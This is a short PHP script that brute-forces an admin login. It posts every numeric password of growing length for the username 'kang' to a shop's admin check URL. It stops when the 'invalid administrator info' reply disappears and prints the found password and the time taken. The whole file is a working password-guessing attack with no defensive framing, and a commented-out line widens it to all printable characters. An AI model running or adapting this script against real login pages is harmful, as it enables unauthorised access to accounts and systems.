<?php
$begin_time = microtime(true);
$url = 'http://shop.kang.com/index.php?p=back&c=Admin&a=check';
$post_data = array('username' => 'kang');
$length = 0;
$password = array();
// $chr = array_combine(range(32, 126), array_map('chr', range(32, 126)));
$chr = array_combine(range(0, 9), range(0, 9));
$ord = array_flip($chr);
$first = reset($chr);
$last = end($chr);
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
while(true) {
	++ $length;
	$end = $length - 1;
	$password = array_fill(0, $length, $first);
	$pass_stop  = array_fill(0, $length, $last);
	while ($password != $pass_stop) {
		foreach($chr as $string) {
			$password[$end] = $string;
			$post_data['password'] = implode('', $password);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
			$response = curl_exec($curl);
			if (strpos($response, '管理员信息非法') === false) {
				echo 'Right:' . $post_data['password'] . PHP_EOL;
				$end_time = microtime(true);
				echo 'Totol Time: ', $end_time-$begin_time;
				die;
			}
			else {
				echo 'Password:', $post_data['password'] . PHP_EOL;
			}
		}

		for($left = $end-1; isset($password[$left]) && $password[$left]==$last; --$left) ;

		if (isset($password[$left]) && $password[$left] != $last) {
			$password[$left] = $chr[$ord[$password[$left]]+1];
			for ($index = $left+1; $index<$length; ++$index) {
				$password[$index] = $first;
			}
		}
	}
}